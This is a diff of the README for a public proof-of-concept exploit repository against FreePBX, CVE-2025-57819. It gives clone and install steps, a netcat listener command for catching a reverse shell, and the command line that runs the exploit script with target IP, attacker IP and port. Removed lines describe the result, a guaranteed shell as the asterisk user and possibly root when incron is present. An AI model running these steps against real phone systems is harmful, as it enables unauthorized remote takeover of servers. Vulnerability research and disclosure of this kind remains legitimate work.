@@ -111,38 +111,22 @@ Result: Root shell on reverse listener (if incron available).
 git clone https://github.com/JazzTheRabbit/cve-2025-57819.git
 cd cve-2025-57819
 pip3 install requests
-chmod +x freepbx_exploit.py
+chmod +x JTR-CVE-2025-57819.py
 ```
 
 ## Usage
 
 ```bash
-# Terminal 1: Start listener
-nc -lvnp 9955
+# Setup Netcat Listener
+nc -lvnp <Listener Port>
 
-# Terminal 2: Run exploit
-python3 freepbx_exploit.py <TARGET_IP> <YOUR_IP> <PORT>
+# Run The Exploit
+python3 JTR-CVE-2025-57819.py <TARGET_IP> <YOUR_IP> <PORT>
 ```
-
-Example:
-```bash
-python3 freepbx_exploit.py 192.168.1.100 10.10.14.231 9955
-```
-
-### Shell Access
-
-**Guaranteed:** Asterisk user shell (uid=999)  
-**Conditional:** Root shell (if incron/sysadmin_manager available)
-
-If incron is not available on the target, the script spawns a reverse shell as the low privilege `asterisk` user.
-
----
 
 ## PoC
 
-<video width="100%" controls>
-  <source src="./PoC_Video.mp4" type="video/mp4">
-</video>
+![PoC Screenshot](./FreePBX_PoC.png)
 
 ---
 
